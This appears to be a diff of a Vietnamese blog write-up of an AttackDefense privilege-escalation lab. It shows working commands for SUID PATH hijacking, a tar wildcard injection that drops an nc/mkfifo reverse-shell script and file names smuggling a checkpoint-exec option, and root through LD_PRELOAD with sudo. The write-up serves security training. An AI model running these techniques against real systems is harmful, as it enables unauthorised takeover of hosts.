@@ -33,8 +33,8 @@
 <meta property="article:published_time" content="2021-01-26T10:06:32.000Z">
 <meta property="article:modified_time" content="2021-01-27T03:28:45.405Z">
 <meta property="article:author" content="minhnq22">
-<meta property="article:tag" content="medium">
 <meta property="article:tag" content="attackdefense">
+<meta property="article:tag" content="medium">
 <meta name="twitter:card" content="summary">
 
 
@@ -244,13 +244,13 @@
 </div>
   <div class="links-of-author site-overview-item animated">
       <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
         <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
         <a href="https://www.facebook.com/minhnq22" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://instagram.com/minhnq22" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
       </span>
   </div>
 
@@ -329,7 +329,7 @@
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>5 mins.</span>
+      <span>6 mins.</span>
     </span>
 </div>
 
@@ -343,31 +343,113 @@
         <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link: <a target="_blank" rel="noopener" href="https://attackdefense.com/challengedetails?cid=2021">https://attackdefense.com/challengedetails?cid=2021</a><br>Difficulty: Medium (Để làm được thì dễ, để hiểu được thì khó :/)</p>
 <p>Bài này yêu cầu đơn giản là leo thang đặc quyền, từ user low-level đến super-user. </p>
 <a id="more"></a>
-<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/read-submission</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
+&#x2F;usr&#x2F;bin&#x2F;read-submission
+&#x2F;usr&#x2F;bin&#x2F;sudo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>Thấy một file binary lạ hoắc là read-submission. Điều tra thêm thông tin về thằng này.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ ls -al /usr/bin/read-submission</span><br><span class="line">-rwsr-xr-x 1 teacher teacher 10984 Oct 10 16:17 /usr/bin/read-submission</span><br><span class="line"></span><br><span class="line">student@attackdefense:~$ /usr/bin/read-submission</span><br><span class="line">Maths: 94</span><br><span class="line">Science: 85</span><br><span class="line">English: 67</span><br><span class="line">Economics: 88</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ ls -al &#x2F;usr&#x2F;bin&#x2F;read-submission
+-rwsr-xr-x 1 teacher teacher 10984 Oct 10 16:17 &#x2F;usr&#x2F;bin&#x2F;read-submission
+
+student@attackdefense:~$ &#x2F;usr&#x2F;bin&#x2F;read-submission
+Maths: 94
+Science: 85
+English: 67
+Economics: 88<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>File binary này của user teacher, và do có SUID nên user student có thể chạy file này với quyền của user teacher. Việc nó làm là hiển thị ra mấy cái điểm số kia. Tìm kiếm xem file binary này sử dụng binary nào khác không. Việc này nhắm tới cách leo thang lên quyền của user teacher bằng PATH evn.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ strings /usr/bin/read-submission</span><br><span class="line">...</span><br><span class="line">AWAVI</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">read-file</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ strings &#x2F;usr&#x2F;bin&#x2F;read-submission
+...
+AWAVI
+AUATL
+[]A\A]A^A_
+read-file
+;*3$&quot;
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Bằng cách vi diệu nào đó :)) có cái file binary này “read-file”.<br>Đùa đấy, ý tưởng là đang muốn leo lên quyền của user teacher, vậy nên sẽ cần recon thông tin của user teacher. Việc tìm các file thuộc sở hữu của user teacher biết đâu sẽ xem lại một vài thông tin hay ho?</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ find / -user teacher 2&gt;/dev/null</span><br><span class="line">/usr/bin/read-submission</span><br><span class="line">/usr/bin/read-file</span><br><span class="line">/home/teacher</span><br><span class="line">/home/teacher/backup</span><br><span class="line">/home/teacher/backup/schedule</span><br><span class="line">/home/teacher/FLAG1</span><br><span class="line">/home/teacher/student-evaluation</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ find &#x2F; -user teacher 2&gt;&#x2F;dev&#x2F;null
+&#x2F;usr&#x2F;bin&#x2F;read-submission
+&#x2F;usr&#x2F;bin&#x2F;read-file
+&#x2F;home&#x2F;teacher
+&#x2F;home&#x2F;teacher&#x2F;backup
+&#x2F;home&#x2F;teacher&#x2F;backup&#x2F;schedule
+&#x2F;home&#x2F;teacher&#x2F;FLAG1
+&#x2F;home&#x2F;teacher&#x2F;student-evaluation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Nhìn xem, <em>/usr/bin/read-file</em>, và lúc này tôi bắt đầu tìm trong đống strings được dump ra từ <em>read-submission</em> những file kia, và nhận được <em>read-file</em>.<br>Không cần biết thằng <em>read-file</em> nó làm cái con mẹ gì, leo quyền cái đã…</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ mkdir duma</span><br><span class="line">student@attackdefense:~$ cd duma</span><br><span class="line">student@attackdefense:~/duma$ echo &quot;/bin/bash&quot; &gt; read-file</span><br><span class="line">student@attackdefense:~/duma$ chmod +x read-file </span><br><span class="line">student@attackdefense:~/duma$ export PATH=.:$PATH</span><br><span class="line">student@attackdefense:~/duma$ echo $PATH</span><br><span class="line">.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">student@attackdefense:~/duma$ read-submission</span><br><span class="line">teacher@attackdefense:~/duma$ id</span><br><span class="line">uid=998(teacher) gid=999(student) groups=999(student)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ mkdir duma
+student@attackdefense:~$ cd duma
+student@attackdefense:~&#x2F;duma$ echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; read-file
+student@attackdefense:~&#x2F;duma$ chmod +x read-file 
+student@attackdefense:~&#x2F;duma$ export PATH&#x3D;.:$PATH
+student@attackdefense:~&#x2F;duma$ echo $PATH
+.:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin
+student@attackdefense:~&#x2F;duma$ read-submission
+teacher@attackdefense:~&#x2F;duma$ id
+uid&#x3D;998(teacher) gid&#x3D;999(student) groups&#x3D;999(student)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Game dễ! hoặc là chưa đến đoạn khó :/<br>Mục tiêu tiếp theo bây giờ là phải leo lên quyền của user admin. Ngó vào thư mục của admin xem có gì.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home$ cd admin</span><br><span class="line">teacher@attackdefense:/home/admin$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 1 admin admin 4096 Jan 26 10:12 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 10 16:17 ..</span><br><span class="line">-r-------- 1 admin admin   33 Oct 10 16:17 FLAG2</span><br><span class="line">-rw-rw-r-- 1 admin admin  168 Jan 26 10:28 teacher.tar.gz</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">teacher@attackdefense:&#x2F;home$ cd admin
+teacher@attackdefense:&#x2F;home&#x2F;admin$ ls -al
+total 20
+drwxr-xr-x 1 admin admin 4096 Jan 26 10:12 .
+drwxr-xr-x 1 root  root  4096 Oct 10 16:17 ..
+-r-------- 1 admin admin   33 Oct 10 16:17 FLAG2
+-rw-rw-r-- 1 admin admin  168 Jan 26 10:28 teacher.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Sau mấy lần chạy lệnh <em>ls -al</em> trong vô vọng, thấy là cái file nén <em>teacher.tar.gz</em> có thời gian sửa đổi rất mới, và được cập nhật/ghi đè liên tục trong một khoảng thời gian. Đoán là sẽ có một cái cronjob nào đang tác động lên nó.<br>Nhưng!<br>Đúng rồi, câu chuyện đẹp lúc đéo nào cũng bị ngắt bởi từ “Nhưng”. Tôi đéo thể tìm được cronjob nào tác động lên file nén kia cả :D<br>Cơ mà thấy nội dung trong file nén giống giống với nội dung bên trong thư mục <em>/home/teacher/backup</em>. Thế thì thử tạo thêm file trong thư mục backup đấy xem thằng admin có nén luôn cái file mình tạo không nhở :D</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;Bruh!&quot; &gt; Nen_file_nay_di.txt </span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 1 teacher teacher 4096 Jan 27 02:38 .</span><br><span class="line">drwxr-xr-x 1 teacher teacher 4096 Oct 10 16:17 ..</span><br><span class="line">-rw-rw-r-- 1 teacher student    6 Jan 27 02:38 Nen_file_nay_di.txt</span><br><span class="line">-rw-rw-r-- 1 teacher teacher   76 Oct 10 10:43 schedule</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ cd ..</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher$ cp /home/admin/teacher.tar.gz .</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher$ tar -zxvf teacher.tar.gz </span><br><span class="line">Nen_file_nay_di.txt</span><br><span class="line">schedule</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ echo &quot;Bruh!&quot; &gt; Nen_file_nay_di.txt 
+
+teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ ls -al
+total 20
+drwxr-xr-x 1 teacher teacher 4096 Jan 27 02:38 .
+drwxr-xr-x 1 teacher teacher 4096 Oct 10 16:17 ..
+-rw-rw-r-- 1 teacher student    6 Jan 27 02:38 Nen_file_nay_di.txt
+-rw-rw-r-- 1 teacher teacher   76 Oct 10 10:43 schedule
+
+teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ cd ..
+
+teacher@attackdefense:&#x2F;home&#x2F;teacher$ cp &#x2F;home&#x2F;admin&#x2F;teacher.tar.gz .
+
+teacher@attackdefense:&#x2F;home&#x2F;teacher$ tar -zxvf teacher.tar.gz 
+Nen_file_nay_di.txt
+schedule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Hay lắm tml, schedule của thằng user admin nén toàn bộ thư mục backup.</p>
 <h3 id="Tar-Wildcard-Injection"><a href="#Tar-Wildcard-Injection" class="headerlink" title="Tar Wildcard Injection"></a>Tar Wildcard Injection</h3><p>Ý tưởng là sẽ đánh vào quá trình nén file của <em>tar</em>, anh em có thể đọc thêm ở đây <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">Exploiting Wildcard for Privilege Escalation</a>.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;mkfifo /tmp/ahihi; nc localhost 4444 0&lt;/tmp/ahihi | /bin/sh &gt;/tmp/ahihi 2&gt;&amp;1; rm /tmp/ahihi&quot; &gt; shell.sh</span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ echo &quot;mkfifo &#x2F;tmp&#x2F;ahihi; nc localhost 4444 0&lt;&#x2F;tmp&#x2F;ahihi | &#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;ahihi 2&gt;&amp;1; rm &#x2F;tmp&#x2F;ahihi&quot; &gt; shell.sh
+teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;
+teacher@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ echo &quot;&quot; &gt; --checkpoint&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>Mở một tab khác, bật netcat để listen trên port 4444 và…</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ nc -lnvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58494</span><br><span class="line">id</span><br><span class="line">uid=997(admin) gid=997(admin) groups=997(admin)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Lấy PTY để thao tác terminal cho tiện hơn</span></span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="line">See &quot;man sudo_root&quot; for details.</span><br><span class="line"></span><br><span class="line">admin@attackdefense:/home/teacher/backup$</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">student@attackdefense:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58494
+id
+uid&#x3D;997(admin) gid&#x3D;997(admin) groups&#x3D;997(admin)
+
+#Lấy PTY để thao tác terminal cho tiện hơn
+python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+admin@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Có shell của user admin rồi, giờ còn leo lên root nữa thôi. Kiểm tra sudoer của user admin.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin@attackdefense:/home/teacher/backup$ sudo -l</span><br><span class="line">Matching Defaults entries for admin on attackdefense:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User admin may run the following commands on attackdefense:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2</span><br><span class="line"></span><br><span class="line">admin@attackdefense:/home/teacher/backup$ sudo apache2</span><br><span class="line">[Wed Jan 27 03:02:17.276254 2021] [core:warn] [pid 364] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not defined</span><br><span class="line">apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">admin@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ sudo -l
+Matching Defaults entries for admin on attackdefense:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,
+    env_keep+&#x3D;LD_PRELOAD
+
+User admin may run the following commands on attackdefense:
+    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;apache2
+
+admin@attackdefense:&#x2F;home&#x2F;teacher&#x2F;backup$ sudo apache2
+[Wed Jan 27 03:02:17.276254 2021] [core:warn] [pid 364] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not defined
+apache2: Syntax error on line 80 of &#x2F;etc&#x2F;apache2&#x2F;apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Để ý thấy có apache2 có thể chạy với quyền sudo mà chả cần password, cơ mà, việc leo quyền với apache2 khá căng, hơn nữa file cấu hình của apache có vẻ đã được tuỳ biến chỗ nào đó khiến tôi đéo thể truy cập được vào các thành phần thông tin nhạy cảm bên trong.<br>Để ý kỹ lại một lần nữa, thấy cái dòng <em>env_keep+=LD_PRELOAD</em> khá lạ. Google! (Vãi cả beep kết quả tìm kiếm đầu tiên hiện ra luôn ạ <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">Linux Privilege Escalation using LD_Preload</a>)</p>
 <blockquote>
 <p><em>What is LD_PRELOAD?</em><br>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</p>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin@attackdefense:/tmp/duma$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line"></span><br><span class="line">admin@attackdefense:/tmp/duma$ sudo LD_PRELOAD=shell.so apache2</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">admin@attackdefense:&#x2F;tmp&#x2F;duma$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+admin@attackdefense:&#x2F;tmp&#x2F;duma$ sudo LD_PRELOAD&#x3D;shell.so apache2
+# whoami
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
     </div>
 
     
@@ -376,8 +458,8 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/medium/" rel="tag"># medium</a>
               <a href="/tags/attackdefense/" rel="tag"># attackdefense</a>
+              <a href="/tags/medium/" rel="tag"># medium</a>
           </div>
 
         
